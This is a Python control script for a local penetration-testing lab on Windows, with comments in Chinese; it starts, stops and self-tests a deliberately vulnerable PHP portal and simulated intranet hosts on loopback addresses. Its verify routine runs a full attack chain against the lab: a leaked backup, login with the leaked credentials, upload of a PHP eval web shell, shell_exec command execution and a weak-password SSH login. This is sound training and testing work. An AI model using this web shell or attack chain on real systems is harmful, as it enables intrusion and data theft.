#!/usr/bin/env python3
# labctl.py — 靶场进程管理 + 全链路自检。
#
#   python labctl.py start     启动（幂等：已在跑就直接报告）
#   python labctl.py stop      停止（先核对进程身份，绝不按裸 pid 杀）
#   python labctl.py status    运行状态与端口
#   python labctl.py verify    端到端自检：侦察→泄露→登录→上传→执行→SSH→纵深证据
#
# 为什么不用 Start-Process：Windows PowerShell 5.1 在环境里同时存在 http_proxy 与
# HTTP_PROXY 时会抛「已添加项。字典中的关键字…」而无法启动任何进程；本机（以及带
# 代理工具的开发机）经常是这个状态。用 Python subprocess + DETACHED_PROCESS 拉起，
# 不经过 PowerShell，也不受这类环境串扰。
import ctypes
import ctypes.wintypes as wt
import http.client
import json
import os
import socket
import subprocess
import sys
import time

LAB = os.path.dirname(os.path.abspath(__file__))
STATE_DIR = os.path.join(LAB, "state")
STATE_FILE = os.path.join(STATE_DIR, "lab.json")
PHP_EXE = os.path.join(LAB, "php", "php.exe")
DMZ_ROOT = os.path.join(LAB, "dmz")
TARGETS_PY = os.path.join(LAB, "intranet_targets.py")

DMZ_ADDR = ("127.0.0.1", 8080)
SSH_ADDR = ("127.0.0.2", 2222)
DATA_ADDR = ("127.0.0.3", 8000)

ADMIN_USER, ADMIN_PASS = "portal_user", "Portal_2026!"
FLAG_A, FLAG_B = "FLAG-INTRANET-A-2b91", "FLAG-INTRANET-B-7f3a"

DETACHED_PROCESS = 0x00000008
CREATE_NEW_PROCESS_GROUP = 0x00000200
CREATE_NO_WINDOW = 0x08000000

PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
PROCESS_TERMINATE = 0x0001


# ---------------------------------------------------------------- 进程工具
def proc_exe(pid):
    """返回进程映像路径（无权访问/已退出 → None）。"""
    k32 = ctypes.windll.kernel32
    h = k32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, int(pid))
    if not h:
        return None
    try:
        buf = ctypes.create_unicode_buffer(2048)
        size = wt.DWORD(2048)
        if k32.QueryFullProcessImageNameW(h, 0, buf, ctypes.byref(size)):
            return buf.value
        return None
    finally:
        k32.CloseHandle(h)


def same_path(a, b):
    if not a or not b:
        return False
    return os.path.normcase(os.path.normpath(a)) == os.path.normcase(os.path.normpath(b))


def pid_alive(pid):
    return proc_exe(pid) is not None


def listening_pids(port):
    """用 netstat 找监听某端口的 pid（不依赖 psutil）。"""
    pids = set()
    try:
        raw = subprocess.run(
            ["netstat", "-ano", "-p", "tcp"],
            capture_output=True, timeout=15, creationflags=CREATE_NO_WINDOW,
        ).stdout
        out = raw.decode("mbcs", "replace") if os.name == "nt" else raw.decode("utf-8", "replace")
    except Exception:  # noqa: BLE001
        return pids
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 5 and parts[0].upper() == "TCP" and parts[3].upper() == "LISTENING":
            if parts[1].endswith(":" + str(port)):
                try:
                    pids.add(int(parts[4]))
                except ValueError:
                    pass
    return pids


def kill_tree(pid):
    subprocess.run(["taskkill", "/PID", str(pid), "/T", "/F"],
                   capture_output=True, creationflags=CREATE_NO_WINDOW)


def port_free(host, port):
    s = socket.socket()
    s.settimeout(0.4)
    try:
        return s.connect_ex((host, port)) != 0
    finally:
        s.close()


# ---------------------------------------------------------------- 状态文件
def read_state():
    try:
        with open(STATE_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:  # noqa: BLE001
        return {}


def write_state(state):
    os.makedirs(STATE_DIR, exist_ok=True)
    with open(STATE_FILE, "w", encoding="utf-8") as f:
        json.dump(state, f, indent=2, ensure_ascii=False)


def owned(entry):
    return entry and pid_alive(entry.get("pid", 0)) and same_path(proc_exe(entry["pid"]), entry.get("exe"))


# ---------------------------------------------------------------- 启动 / 停止
def spawn(name, argv, log_name, cwd):
    os.makedirs(STATE_DIR, exist_ok=True)
    log_path = os.path.join(STATE_DIR, log_name)
    log = open(log_path, "ab", buffering=0)
    flags = DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW
    proc = subprocess.Popen(argv, cwd=cwd, stdin=subprocess.DEVNULL,
                            stdout=log, stderr=log, creationflags=flags, close_fds=True)
    log.close()  # 子进程已持有自己的句柄，父进程这份关掉，避免句柄泄漏
    return {"pid": proc.pid, "exe": argv[0], "log": log_path, "started": int(time.time())}


def wait_ready(timeout=25):
    deadline = time.time() + timeout
    problems = []
    while time.time() < deadline:
        ok_http = http_ok(*DMZ_ADDR, path="/")
        ok_ssh = ssh_banner()
        ok_data = http_ok(*DATA_ADDR, path="/secret/flag")
        if ok_http and ok_ssh and ok_data:
            return True, []
        problems = []
        if not ok_http:
            problems.append("DMZ 8080 未就绪")
        if not ok_ssh:
            problems.append("SSH 2222 未就绪")
        if not ok_data:
            problems.append("数据站 8000 未就绪")
        time.sleep(0.5)
    return False, problems


def http_ok(host, port, path="/"):
    try:
        st, _, _ = http_req("GET", host, port, path, timeout=2)
        return st == 200
    except Exception:  # noqa: BLE001
        return False


def ssh_banner():
    try:
        s = socket.create_connection(SSH_ADDR, 1.5)
        try:
            return s.recv(16).startswith(b"SSH-")
        finally:
            s.close()
    except Exception:  # noqa: BLE001
        return False


def cmd_start():
    state = read_state()
    if owned(state.get("dmz")) and owned(state.get("targets")):
        print("lab already running (dmz pid=%d, targets pid=%d)" % (state["dmz"]["pid"], state["targets"]["pid"]))
        print_topology()
        return 0

    # 残留/半启动状态先清掉，避免「端口被占但不是我起的」
    if state:
        cmd_stop()
        time.sleep(0.8)
    leftovers = []
    for port in (DMZ_ADDR[1], SSH_ADDR[1], DATA_ADDR[1]):
        for pid in listening_pids(port):
            exe = proc_exe(pid)
            if exe and same_path(exe, PHP_EXE):
                leftovers.append((port, pid, exe))
    for port, pid, exe in leftovers:
        print("cleaning stale lab listener on :%d (pid=%d)" % (port, pid))
        kill_tree(pid)
    if leftovers:
        time.sleep(1)

    for host, port, label in ((*DMZ_ADDR, "DMZ"), (*SSH_ADDR, "SSH"), (*DATA_ADDR, "data site")):
        if not port_free(host, port):
            pid = next(iter(listening_pids(port)), None)
            print("ERROR: %s 端口 %s:%d 已被占用（pid=%s, exe=%s）"
                  % (label, host, port, pid, proc_exe(pid) if pid else "?"))
            return 2

    if not os.path.isfile(PHP_EXE):
        print("ERROR: 找不到 %s" % PHP_EXE)
        return 2
    os.makedirs(os.path.join(DMZ_ROOT, "upload"), exist_ok=True)

    state = {
        "dmz": spawn("dmz", [PHP_EXE, "-S", "%s:%d" % DMZ_ADDR, "-t", DMZ_ROOT,
                             os.path.join(DMZ_ROOT, "router.php")], "dmz.log", LAB),
        "targets": spawn("targets", [sys.executable, TARGETS_PY], "targets.log", LAB),
    }
    write_state(state)

    ok, problems = wait_ready()
    if not ok:
        print("ERROR: 启动失败（%s），日志：" % "，".join(problems))
        for key in ("dmz", "targets"):
            print("  %s: %s" % (key, tail(state[key]["log"])))
        cmd_stop()
        return 1

    print("lab up: dmz pid=%d, targets pid=%d" % (state["dmz"]["pid"], state["targets"]["pid"]))
    print_topology()
    return 0


def cmd_stop():
    state = read_state()
    stopped = 0
    for key in ("dmz", "targets"):
        entry = state.get(key)
        if not entry:
            continue
        pid = entry.get("pid")
        if not pid_alive(pid):
            print("%s: pid=%s 已不在" % (key, pid))
            continue
        if not same_path(proc_exe(pid), entry.get("exe")):
            print("%s: pid=%s 身份不符（现在是 %s），不杀" % (key, pid, proc_exe(pid)))
            continue
        kill_tree(pid)
        stopped += 1
        print("%s: stopped pid=%s" % (key, pid))
    if os.path.isfile(STATE_FILE):
        os.remove(STATE_FILE)
    if not stopped:
        print("nothing to stop")
    return 0


def cmd_status():
    state = read_state()
    dmz_entry = state.get("dmz") or {}
    tgt_entry = state.get("targets") or {}

    dmz_state = "alive" if owned(dmz_entry) else "down"
    if dmz_state == "down":
        for pid in listening_pids(DMZ_ADDR[1]):
            if same_path(proc_exe(pid), PHP_EXE):
                dmz_state, dmz_entry = "alive(无台账)", {"pid": pid}
    tgt_state = "alive" if owned(tgt_entry) else "down"
    if tgt_state == "down" and listening_pids(SSH_ADDR[1]) and listening_pids(DATA_ADDR[1]):
        tgt_state, tgt_entry = "alive(无台账)", {"pid": next(iter(listening_pids(SSH_ADDR[1])))}

    print("%-8s pid=%-7s %s" % ("dmz", dmz_entry.get("pid") or "-", dmz_state))
    print("%-8s pid=%-7s %s" % ("targets", tgt_entry.get("pid") or "-", tgt_state))
    print("http  %s:%d  %s" % (DMZ_ADDR[0], DMZ_ADDR[1], "up" if http_ok(*DMZ_ADDR) else "down"))
    print("ssh   %s:%d  %s" % (SSH_ADDR[0], SSH_ADDR[1], "up" if ssh_banner() else "down"))
    print("data  %s:%d  %s" % (DATA_ADDR[0], DATA_ADDR[1], "up" if http_ok(*DATA_ADDR, path="/secret/flag") else "down"))
    return 0


def print_topology():
    print("""
外网入口   http://127.0.0.1:8080/            门户首页（未知路径返回真 404）
            /robots.txt                     指向 /backup/
            /backup/README.txt              泄露后台账号与上传目录
            /backup/site-20261001.zip       站点备份（config/db.php 里同一套凭据）
            /login.php                      后台登录 portal_user / Portal_2026!
            /admin.php?sid=<sid>            部署面板（上传表单）
            /upload.php?sid=<sid>           补丁上传（不校验扩展名 → 落地即执行）
内网主机A  127.0.0.2:2222  SSH              root/chengjian123、deploy/deploy2026
内网主机B  127.0.0.3:8000  HTTP             /secret/flag = FLAG-INTRANET-B-7f3a

自检：python labctl.py verify""".rstrip())


def tail(path, n=12):
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            return "\n".join(f.read().splitlines()[-n:])
    except Exception:  # noqa: BLE001
        return "(no log)"


# ---------------------------------------------------------------- HTTP 客户端
def http_req(method, host, port, path, body=None, headers=None, timeout=8):
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request(method, path, body=body, headers=headers or {})
        resp = conn.getresponse()
        data = resp.read()
        return resp.status, dict(resp.getheaders()), data
    finally:
        conn.close()


def form(path, fields, host=None, port=None):
    from urllib.parse import urlencode
    body = urlencode(fields).encode()
    return http_req("POST", host or DMZ_ADDR[0], port or DMZ_ADDR[1], path, body=body,
                    headers={"Content-Type": "application/x-www-form-urlencoded"})


def multipart(path, filename, content, field="file", host=None, port=None):
    boundary = "----labctl7f3a2b91"
    head = (
        "--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n" % (boundary, field, filename)
    ).encode()
    tail = ("\r\n--%s--\r\n" % boundary).encode()
    body = head + content + tail
    return http_req("POST", host or DMZ_ADDR[0], port or DMZ_ADDR[1], path, body=body,
                    headers={"Content-Type": "multipart/form-data; boundary=" + boundary})


# ---------------------------------------------------------------- 自检
class Report:
    def __init__(self):
        self.rows = []

    def check(self, name, ok, detail=""):
        self.rows.append((name, ok, detail))
        print("%s %-46s %s" % ("PASS" if ok else "FAIL", name, detail))
        return ok

    def summary(self):
        bad = [r for r in self.rows if not r[1]]
        print("\n%d/%d 通过" % (len(self.rows) - len(bad), len(self.rows)))
        if bad:
            print("失败项：" + "；".join(r[0] for r in bad))
        return 0 if not bad else 1


def cmd_verify():
    rep = Report()
    host, port = DMZ_ADDR

    # 1) 侦察面：首页 / 真 404 / robots / 泄露点
    st, _, body = http_req("GET", host, port, "/")
    rep.check("首页 200 且是 ACME 门户", st == 200 and b"ACME" in body, "status=%d" % st)

    st, _, body = http_req("GET", host, port, "/no-such-path-7f3a")
    rep.check("未知路径返回 404（不是兜底首页）", st == 404, "status=%d len=%d" % (st, len(body)))

    st, _, body = http_req("GET", host, port, "/adminer.php")
    rep.check("已下线的 adminer 不再存在", st == 404, "status=%d" % st)

    st, _, body = http_req("GET", host, port, "/robots.txt")
    rep.check("robots.txt 指向 /backup/", st == 200 and b"/backup/" in body, "status=%d" % st)

    st, _, body = http_req("GET", host, port, "/backup/README.txt")
    rep.check("泄露点 README 可读且含账号", st == 200 and ADMIN_USER.encode() in body, "status=%d" % st)

    st, _, body = http_req("GET", host, port, "/backup/site-20261001.zip")
    rep.check("备份 zip 可下载（PK 头）", st == 200 and body[:2] == b"PK", "status=%d size=%d" % (st, len(body)))

    # 2) 后台登录
    st, _, body = form("/login.php?format=json", {"username": ADMIN_USER, "password": "wrong"})
    rep.check("错误口令被拒（401）", st == 401, "status=%d" % st)

    st, _, body = form("/login.php?format=json", {"username": ADMIN_USER, "password": ADMIN_PASS})
    sid = ""
    try:
        sid = json.loads(body.decode()).get("sid", "")
    except Exception:  # noqa: BLE001
        pass
    rep.check("泄露的凭据可登录", st == 200 and bool(sid), "status=%d sid=%s" % (st, sid[:12] + "…" if sid else "-"))

    st, _, body = http_req("GET", host, port, "/admin.php")
    rep.check("未登录访问面板被挡（302/401）", st in (302, 401), "status=%d" % st)

    # 3) 上传 → 落地即执行
    marker = "LABOK%d" % (int(time.time()) % 100000)
    payload = b"<?php @eval($_POST['cmd']); ?>\n"
    st, _, body = multipart("/upload.php?sid=" + sid, "probe_%s.php" % marker, payload)
    url = ""
    try:
        url = json.loads(body.decode()).get("url", "")
    except Exception:  # noqa: BLE001
        pass
    rep.check("登录态可上传补丁", st == 200 and url.endswith(".php"), "status=%d url=%s" % (st, url or "-"))

    if url:
        st, _, body = form(url, {"cmd": 'echo "S".(20+22)."E";'})
        rep.check("上传的马可执行 PHP（平台 eval 探针 S42E）", st == 200 and b"S42E" in body,
                  "status=%d body=%r" % (st, body[:60]))

        st, _, body = form(url, {"cmd": 'echo @shell_exec("whoami");'})
        rep.check("马可执行系统命令（shell_exec，隧道部署前提）", st == 200 and len(body.strip()) > 0,
                  "whoami=%r" % body.strip()[:40])

        st, _, body = form(url, {"cmd": 'echo PHP_OS_FAMILY;'})
        rep.check("目标自报平台（供隧道选 chisel.exe）", b"Windows" in body or b"Linux" in body,
                  "PHP_OS_FAMILY=%r" % body.strip()[:20])

        # 清理
        form(url, {"cmd": 'echo @unlink(__FILE__)?"DELOK":"DELFAIL";'})
        path = os.path.join(DMZ_ROOT, "upload", os.path.basename(url))
        if os.path.isfile(path):
            os.remove(path)
        st, _, _ = http_req("GET", host, port, url)
        rep.check("自检痕迹已清理", st == 404, "status=%d" % st)

    # 4) 内网主机 A：SSH 口令横向
    try:
        import paramiko
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(SSH_ADDR[0], SSH_ADDR[1], username="root", password="chengjian123", timeout=6,
                  allow_agent=False, look_for_keys=False)
        _, out, _ = c.exec_command("cat flag.txt", timeout=6)
        text = out.read().decode().strip()
        code = out.channel.recv_exit_status()
        rep.check("SSH 弱口令可登录并取回 flag", text == FLAG_A and code == 0, "flag=%s exit=%d" % (text, code))
        _, out, _ = c.exec_command("false", timeout=6)
        out.read()
        rep.check("SSH 回传真实退出码", out.channel.recv_exit_status() == 1,
                  "exit=%d" % out.channel.recv_exit_status())
        _, out, _ = c.exec_command("nosuchcmd", timeout=6)
        out.read()
        rep.check("未知命令 exit=127", out.channel.recv_exit_status() == 127,
                  "exit=%d" % out.channel.recv_exit_status())
        c.close()

        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        denied = False
        try:
            c.connect(SSH_ADDR[0], SSH_ADDR[1], username="root", password="bad", timeout=6,
                      allow_agent=False, look_for_keys=False)
        except paramiko.AuthenticationException:
            denied = True
        except Exception:  # noqa: BLE001
            denied = True
        finally:
            try:
                c.close()
            except Exception:  # noqa: BLE001
                pass
        rep.check("错误口令被拒", denied)
    except ImportError:
        rep.check("SSH 检查（缺 paramiko）", False, "pip install paramiko")
    except Exception as exc:  # noqa: BLE001
        rep.check("SSH 检查", False, "%s: %s" % (type(exc).__name__, exc))

    # 5) 内网主机 B：纵深证据
    st, _, body = http_req("GET", *DATA_ADDR, "/secret/flag")
    rep.check("数据站 /secret/flag 可读", st == 200 and FLAG_B.encode() in body, "status=%d" % st)

    return rep.summary()


def cmd_serve():
    """前台托管（调试用）：本进程活着靶场就活着，Ctrl+C 一起停。
    自动化环境里没有真正的「用户 shell」时用这个，避免子进程被会话回收。"""
    state = read_state()
    if state:
        cmd_stop()
        time.sleep(0.8)
    procs = []
    state = {}
    for key, argv, log_name in (
        ("dmz", [PHP_EXE, "-S", "%s:%d" % DMZ_ADDR, "-t", DMZ_ROOT, os.path.join(DMZ_ROOT, "router.php")], "dmz.log"),
        ("targets", [sys.executable, TARGETS_PY], "targets.log"),
    ):
        os.makedirs(STATE_DIR, exist_ok=True)
        log = open(os.path.join(STATE_DIR, log_name), "ab", buffering=0)
        proc = subprocess.Popen(argv, cwd=LAB, stdin=subprocess.DEVNULL, stdout=log, stderr=log)
        log.close()
        procs.append(proc)
        state[key] = {"pid": proc.pid, "exe": argv[0], "log": os.path.join(STATE_DIR, log_name),
                      "started": int(time.time())}
    write_state(state)
    ok, problems = wait_ready()
    print("ready" if ok else "not ready: " + "，".join(problems), flush=True)
    try:
        while True:
            if any(p.poll() is not None for p in procs):
                print("a lab process exited, shutting down", flush=True)
                break
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        for p in procs:
            if p.poll() is None:
                p.terminate()
        if os.path.isfile(STATE_FILE):
            os.remove(STATE_FILE)
    return 0


def main():
    action = sys.argv[1] if len(sys.argv) > 1 else "status"
    table = {"start": cmd_start, "stop": cmd_stop, "status": cmd_status,
             "verify": cmd_verify, "serve": cmd_serve}
    if action not in table:
        print(__doc__)
        return 2
    return table[action]()


if __name__ == "__main__":
    sys.exit(main())
